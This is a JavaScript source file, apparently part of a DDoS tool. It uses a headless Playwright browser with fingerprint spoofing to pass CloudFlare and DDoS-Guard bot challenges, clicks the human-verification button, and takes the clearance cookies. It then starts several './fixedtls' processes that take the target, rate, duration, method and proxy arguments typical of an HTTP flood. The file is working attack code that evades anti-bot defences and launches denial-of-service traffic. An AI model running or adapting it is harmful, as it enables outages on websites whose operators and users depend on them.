const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;
const fs = require('fs');

const JSList = {
  js: [
    { name: "CloudFlare (Secure JS)", navigations: 2, locate: '<h2 class="h2" id="challenge-running">' },
    { name: "CloudFlare", navigations: 1, locate: '<title>Just a moment...</title>' },
    { name: "DDoS-Guard", navigations: 1, locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;' },
    { name: "DDoS-Guard-en", navigations: 1, locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";' }
  ]
};

const ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError", "TimeoutError", "DeprecationWarning"];
const ignoreCodes = ["ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO", "DEP0123", "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"];

process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);

function handleError(e) {
  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
  console.warn(e);
}

const sleep = (ms) => new Promise(res => setTimeout(res, ms));
const randomIntFromInterval = (min, max) => Math.floor(Math.random() * (max - min + 1) + min);
const cookiesToStr = (cookies) => cookies.map(({ name, value }) => `${name}=${value}`).join(";");
const JSDetection = (html) => JSList.js.find(({ locate }) => html.includes(locate));

function log(msg) {
  const time = new Date().toTimeString().split(' ')[0];
  console.log(`(${time}) - ${msg}`);
}

function getRandomUAConfig() {
  const configs = [
    {
      name: 'Windows Chrome',
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36',
      viewport: { width: 1920, height: 1080 },
      deviceScaleFactor: 1,
      isMobile: false,
      hasTouch: false
    },
    {
      name: 'iPhone Safari',
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
      viewport: { width: 390, height: 844 },
      deviceScaleFactor: 3,
      isMobile: true,
      hasTouch: true
    }
  ];
  return configs[Math.floor(Math.random() * configs.length)];
}

async function solverInstance(args) {
  log(`(${`PlayWright`.cyan}) Запуск браузера.`);

  const browser = await playwright.chromium.launch({
    headless: true,
    args: [
      '--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu',
      '--disable-features=site-per-process,IsolateOrigins', '--disable-infobars', '--no-first-run',
      '--ignore-certificate-errors', '--ignore-ssl-errors', '--no-default-browser-check',
      '--disable-popup-blocking', '--disable-extensions', '--disable-background-networking',
      '--disable-background-timer-throttling', '--disable-renderer-backgrounding', '--disable-hang-monitor',
      '--disable-sync', '--metrics-recording-only', '--disable-default-apps', '--mute-audio',
      '--no-zygote', '--max-connections-per-host=6', '--autoplay-policy=no-user-gesture-required',
      '--disable-blink-features=AutomationControlled'
    ]
  });

  const uaConfig = getRandomUAConfig();
  log(`[${'UA'.cyan}] Используется профиль: ${uaConfig.name.green}`);

  const context = await browser.newContext({
    userAgent: uaConfig.userAgent,
    viewport: uaConfig.viewport,
    deviceScaleFactor: uaConfig.deviceScaleFactor,
    isMobile: uaConfig.isMobile,
    hasTouch: uaConfig.hasTouch,
    javaScriptEnabled: true
  });

  // Добавляем куку до открытия страницы
  await context.addCookies([{
    name: 'ac_xf_user',
    value: '229498',
    domain: 'www.legalizer.com',
    path: '/',
    httpOnly: false,
    secure: true,
    sameSite: 'Lax'
  }]);

  const page = await context.newPage();

  await page.addInitScript(() => {
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    window.chrome = { runtime: {} };
    Object.defineProperty(navigator, 'languages', { get: () => ['ru-RU', 'ru'] });
    Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3] });
    const getParameter = WebGLRenderingContext.prototype.getParameter;
    WebGLRenderingContext.prototype.getParameter = function (parameter) {
      if (parameter === 37445) return 'Intel Inc.';
      if (parameter === 37446) return 'Intel Iris OpenGL Engine';
      return getParameter.call(this, parameter);
    };
    const originalQuery = window.navigator.permissions.query;
    window.navigator.permissions.query = (parameters) => (
      parameters.name === 'notifications'
        ? Promise.resolve({ state: Notification.permission })
        : originalQuery(parameters)
    );
  });

  try {
    await page.goto(args.Target, { waitUntil: 'domcontentloaded' });
  } catch (e) {
    await browser.close();
    throw e;
  }

  log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);

  await processProtection(page, browser);

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();

  log(`(${`Harvester`.green}) Заголовок: ${title}`);
  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);

  for (let i = 0; i < args.Threads; i++) {
    spawn('./fixedtls', [args.Target, uaConfig.userAgent, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
  }

  log(`(${`PlayWright`.green}) Сессия закрыта.`);
  await browser.close();
  return cookies;
}

async function processProtection(page, browser) {
  const html = await page.content();
  const title = await page.title();
  const detected = JSDetection(html);

  if (title === "Access denied") {
    log(`[JSDetect] Доступ к странице запрещён.`);
    return;
  }

  if (detected && detected.name === "CloudFlare") {
    let attempt = 1;
    let screenshotDone = false;

    while (true) {
      log(`[CloudFlare] Попытка #${attempt}`);

      if (attempt === 2 && !screenshotDone) {
        const shot = `verify_attempt_${Date.now()}.png`;
        await page.screenshot({ path: shot, fullPage: true });
        log(`[CloudFlare] Скриншот сохранён: ${shot}`);
        screenshotDone = true;
      }

      const verifyText = page.locator('text=Verifying you are human. This may take a few seconds.').first();
      if (attempt === 1 && await verifyText.count() > 0) {
        log(`[CloudFlare] Обнаружено "Verifying you are human...", жду 20с и перезагружаю.`);
        await page.waitForTimeout(20000);
        await page.reload();
        attempt++;
        continue;
      }

      // Клик по "Verify you are human"
      const verifyBtn = page.locator('text=Verify you are human').first();
      try {
        await verifyBtn.click({ delay: 200 });
        log(`[CloudFlare] Клик по кнопке "Verify you are human"`);
      } catch {
        log(`[CloudFlare] Кнопка не найдена`);
      }

      try {
        await page.waitForNavigation({ timeout: 20000 });
        log(`[CloudFlare] Редирект произошёл`);
      } catch {
        if (attempt >= 2) {
          log(`[CloudFlare] Ожидание редиректа после второй попытки`);
          try {
            await page.waitForNavigation({ timeout: 20000 });
            log(`[CloudFlare] Редирект произошёл после ожидания`);
          } catch {
            log(`[CloudFlare] Редиректа нет, закрываю браузер`);
            await browser.close();
            return;
          }
        }
      }

      const newTitle = await page.title();
      if (newTitle.trim() !== 'Just a moment...') break;

      attempt++;
    }
  }
}

module.exports = { solverInstance };